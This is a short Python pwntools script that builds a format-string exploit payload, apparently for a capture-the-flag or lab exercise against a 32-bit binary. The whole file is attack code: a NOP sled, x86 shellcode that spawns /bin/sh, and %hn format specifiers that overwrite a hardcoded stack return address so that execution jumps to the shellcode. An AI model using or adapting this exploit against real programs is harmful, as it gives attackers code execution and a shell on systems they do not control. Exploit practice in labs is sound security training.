from pwn import *
import sys

offset=int(sys.argv[1],16)
addr_shell=0xbffff54f-offset
ret_address=0xbffff64c-offset
nop_string="\x90"*9
shellcode="\x31\xC0\x83\xEC\x04\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80"
#base %14$n=aaaa
payload=""
payload+=nop_string
payload+=shellcode      #28bytes
payload+=p32(ret_address+2)#4bytes
payload+=p32(ret_address)  #4bytes
value_high=addr_shell>>16
value_low=addr_shell&0xffff
#13+1+9=23
payload+="%"+str(value_high-36-9)+"x%23$hn"
payload+="%"+str(value_low-value_high)+"x%24$hn\n"
print(payload)